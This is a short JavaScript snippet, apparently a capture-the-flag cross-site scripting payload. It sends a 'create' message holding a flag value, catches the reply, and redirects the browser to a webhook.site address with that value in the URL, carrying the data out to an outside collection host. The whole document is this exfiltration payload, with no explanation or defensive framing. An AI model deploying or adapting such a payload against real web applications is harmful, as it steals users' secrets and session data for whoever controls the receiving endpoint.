window.postMessage({type: "create", payload: flag});
window.addEventListener('message', (event) => {
setTimeout(function(){document.location.href = "https://webhook.site/2f16d9d2-d7dc-41ed-b791-41ba3e4de387?flag=${event.data.payload}";},100);
    });
console.log('k');
